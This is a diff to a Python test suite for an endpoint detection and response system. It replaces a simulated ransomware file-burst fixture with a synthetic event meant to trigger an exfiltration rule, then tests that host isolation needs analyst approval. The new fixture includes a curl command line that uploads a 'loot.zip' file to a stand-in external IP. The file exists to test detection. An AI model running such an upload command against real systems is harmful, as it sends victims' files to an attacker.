@@ -99,40 +99,52 @@ def _run_real_detector_event(tmp_path, event: dict, agent_id: str) -> None:
         writer.close()
 
 
-def _ransomware_burst_events(count: int = 5) -> list[dict]:
-    """Five file_create events, same host/process, inside DET-FREQ-001's
-    10s window -- deterministically trips the real ThresholdEngine default
-    rule (frequency=5) without depending on vendor/eyedetect's YAML rule set
-    or the CORR-003-affected correlation engine at all."""
-    return [
-        {
-            "event_type": "file_create",
-            "event_id": f"evt_e2e_burst_{index:03d}",
-            "host_id": _HOST_ID,
-            "timestamp": f"2026-09-13T12:00:0{index}.000Z",
-            "process": {"name": "ransom.exe", "pid": 9999, "process_guid": _GUID},
-            "file": {"path": f"C:\\Users\\victim\\Documents\\file{index}.locked"},
-        }
-        for index in range(count)
-    ]
+def _exfil_event() -> dict:
+    """A real process_create event matching production rule DET-EXFIL-001
+    (curl.exe POSTing a file to an http(s) URL), whose YAML sets
+    ``active_response: ISOLATE_HOST``.
+
+    This used to be a five-event file_create burst tripping the engine's
+    built-in ThresholdEngine default rule DET-FREQ-001. The engine removed that
+    hard-coded detector (ransomware/frequency detection became declarative
+    rules, DET-RANS-001..003, which recommend TERMINATE_PROCESS, not
+    ISOLATE_HOST), so the only production path that still recommends
+    ISOLATE_HOST is a rule that opts in -- DET-EXFIL-001."""
+    return {
+        "event_type": "process_create",
+        "event_id": "evt_" + "7" * 64,
+        "host_id": _HOST_ID,
+        "timestamp": "2026-09-13T12:00:00.000Z",
+        "process": {
+            "name": "curl.exe",
+            "pid": 9999,
+            "process_guid": _GUID,
+            "executable": "C:\\Windows\\System32\\curl.exe",
+            "command_line": "curl.exe -F file=@C:\\Users\\victim\\loot.zip https://203.0.113.9/u",
+        },
+        "parent": {"pid": 5150, "name": "cmd.exe"},
+    }
 
 
-def _run_real_detector_burst(tmp_path, agent_id: str) -> None:
-    """Feeds the burst through the real, unmodified DetectionRun/AlertSink
+def _run_real_detector_burst(tmp_path, agent_id: str) -> str:
+    """Feeds the exfil event through the real, unmodified DetectionRun/AlertSink
     pipeline (manager/detection/factory.py) against the same DB file the
     test's TestClient is using -- exactly the path manager/detection/worker.py
-    exercises in production, minus the async queue."""
+    exercises in production, minus the async queue. Returns the alert_id of
+    the DET-EXFIL-001 alert."""
     conn = db_module.connect()
     run, sink, writer, _context = build_detection_run(
-        conn, alerts_path=tmp_path / "e2e-alerts.ndjson", rules_dir=tmp_path
+        conn, alerts_path=tmp_path / "e2e-alerts.ndjson", rules_dir=_DEFAULT_RULES_DIR
     )
     try:
         sink.agent_id = agent_id
-        for event in _ransomware_burst_events():
-            run.process_event(event)
+        produced = run.process_event(_exfil_event())
         conn.commit()
     finally:
         writer.close()
+    exfil = [a.alert_id for a in produced if a.rule_id == "DET-EXFIL-001"]
+    assert exfil, f"DET-EXFIL-001 did not fire: {[a.rule_id for a in produced]}"
+    return exfil[0]
 
 
 @pytest.fixture()
@@ -798,20 +810,21 @@ def test_safe_collection_auto_dispatches_without_analyst_action_and_succeeds(
 def test_isolate_host_from_real_detector_requires_analyst_approval_then_succeeds(
     client: TestClient, tmp_path
 ) -> None:
-    """Scenario B, run against real detector output: a genuine DET-FREQ-001
-    ransomware-burst detection recommends ISOLATE_HOST (ANALYST_APPROVAL,
+    """Scenario B, run against real detector output: a genuine DET-EXFIL-001
+    exfiltration detection recommends ISOLATE_HOST (ANALYST_APPROVAL,
     same locked tier as KILL_PROCESS) -> an unauthorized attempt to approve
     it is rejected -> a real analyst authorizes it -> dispatch -> ACCEPTED ->
     execution result -> SUCCEEDED -> full audit trail."""
     agent_token = _enroll(client, "agent-isolate", _HOST_ID)
-    _run_real_detector_burst(tmp_path, "agent-isolate")
+    alert_id = _run_real_detector_burst(tmp_path, "agent-isolate")
 
     conn = db_module.connect()
     response_row = conn.execute(
         "SELECT response_id, lifecycle_state, action, tier FROM response_actions "
-        "WHERE alert_id = 'ALT-TH-DET-FREQ-001'"
+        "WHERE alert_id = ?",
+        (alert_id,),
     ).fetchone()
-    assert response_row is not None, "the real ThresholdEngine did not fire DET-FREQ-001"
+    assert response_row is not None, "DET-EXFIL-001 staged no response action"
     assert response_row["action"] == "ISOLATE_HOST"
     assert response_row["tier"] == "ANALYST_APPROVAL"
     assert response_row["lifecycle_state"] == "PENDING"
@@ -898,11 +911,11 @@ def test_isolate_host_command_cannot_be_hijacked_by_a_different_agent(
     poll, accept, or resolve another host's ISOLATE_HOST command."""
     _enroll(client, "agent-victim", _HOST_ID)
     attacker_token = _enroll(client, "agent-attacker", "HOST-ATTACKER")
-    _run_real_detector_burst(tmp_path, "agent-victim")
+    alert_id = _run_real_detector_burst(tmp_path, "agent-victim")
 
     conn = db_module.connect()
     response_row = conn.execute(
-        "SELECT response_id FROM response_actions WHERE alert_id = 'ALT-TH-DET-FREQ-001'"
+        "SELECT response_id FROM response_actions WHERE alert_id = ?", (alert_id,)
     ).fetchone()
     analyst_token = _enroll_analyst(client, "analyst-hijack-check")
     client.post(
